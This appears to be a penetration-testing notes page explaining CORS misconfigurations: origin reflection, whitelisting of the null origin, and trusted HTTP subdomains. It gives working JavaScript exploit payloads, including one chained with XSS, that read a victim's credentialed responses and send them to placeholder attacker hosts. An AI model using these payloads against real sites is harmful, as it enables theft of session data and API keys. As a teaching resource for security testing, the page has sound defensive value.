---
title: CORS
source_url: https://notes.incendium.rocks/pentesting-notes/web/cors
fetched_at: 2026-09-20T01:23:21Z
license: unspecified
category: web
---

Cross-origin resource sharing (CORS) is a browser mechanism which enables controlled access to resources located outside of a given domain. It extends and adds flexibility to the same-origin policy (SOP). However, it also provides potential for cross-domain attacks, if a website's CORS policy is poorly configured and implemented. CORS is not a protection against cross-origin attacks such as cross-site request forgery (CSRF)

<figure><img src="https://3347686964-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fu7zwkkeRzjx9PZGhfY9D%2Fuploads%2FNNRJiE8lX7CsIapOEAQ8%2F0_VmAD1hcLKFLFiHRJ.png?alt=media&amp;token=55f2c119-0e79-4add-a432-047297bc8ea5" alt=""><figcaption></figcaption></figure>

## Basic origin reflection

If the server responds to our Origin header value with:

```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://malicious-website.com
Access-Control-Allow-Credentials: true
```

These headers state that access is allowed from the requesting domain and that the cross-origin requests can include cookies (`Access-Control-Allow-Credentials: true`) and so will be processed in-session.

Because the application reflects arbitrary origins in the `Access-Control-Allow-Origin` header, this means that absolutely any domain can access resources from the vulnerable domain. If the response contains any sensitive information such as an API key or CSRF token, you could retrieve this by placing the following script on your website:

```javascript
<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();

function reqListener() {
	location='//malicious-website.com/log?key='+this.responseText;
};
</script>
```

## Trusted null origin

The specification for the Origin header supports the value `null`. Browsers might send the value `null` in the Origin header in various unusual situations:

* Cross-origin redirects.
* Requests from serialized data.
* Request using the `file:` protocol.
* Sandboxed cross-origin requests.

Some applications might whitelist the `null` origin to support local development of the application. For example, suppose an application receives the following cross-origin request:

```http
GET /sensitive-victim-data
Host: vulnerable-website.com
Origin: null
```

And the server responds with:

```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

In this situation, an attacker can use various tricks to generate a cross-origin request containing the value `null` in the Origin header, this will satisfy the whitelist.

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();

function reqListener() {
location='malicious-website.com/log?key='+this.responseText;
};
</script>"></iframe>
```

## Trusted insecure protocols

Suppose an application that rigorously employs HTTPS also whitelists a trusted subdomain that is using plain HTTP. For example, when the application receives the following request:

`GET /api/requestApiKey HTTP/1.1 Host: vulnerable-website.com Origin: http://trusted-subdomain.vulnerable-website.com Cookie: sessionid=...`

The application responds with:

`HTTP/1.1 200 OK Access-Control-Allow-Origin: http://trusted-subdomain.vulnerable-website.com Access-Control-Allow-Credentials: true`

In this situation, an attacker who is in a position to intercept a victim user's traffic can exploit the CORS configuration to compromise the victim's interaction with the application. This attack involves the following steps:

* The victim user makes any plain HTTP request.
* The attacker injects a redirection to:

  `http://trusted-subdomain.vulnerable-website.com`
* The victim's browser follows the redirect.
* The attacker intercepts the plain HTTP request, and returns a spoofed response containing a CORS request to:

  `https://vulnerable-website.com`
* The victim's browser makes the CORS request, including the origin:

  `http://trusted-subdomain.vulnerable-website.com`
* The application allows the request because this is a whitelisted origin. The requested sensitive data is returned in the response.
* The attacker's spoofed page can read the sensitive data and transmit it to any domain under the attacker's control.

This attack is effective even if the vulnerable website is otherwise robust in its usage of HTTPS, with no HTTP endpoint and all cookies flagged as secure.

Example: a stock check function is vulnerable to XSS. Also the application allows http and subdomains in the CORS.

```http
GET /accountDetails HTTP/2
Host: vulnerable-website.com
Cookie: session=LFw8DmbrnZSubJ3slWc2z91NNi5y3TYP
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
Origin: http://xx.vulnerable-website.com
```

Response:

```http
HTTP/2 200 OK
Access-Control-Allow-Origin: http://xx.vulnerable-website.com
Access-Control-Allow-Credentials: true
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
```

We exploit this together with the XSS vulnerability to get the account details:

```html
<script>
    document.location="http://stock.vulnerable-website.com/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://vulnerable-website.com/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://your-exploit-server.com/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
</script>
```
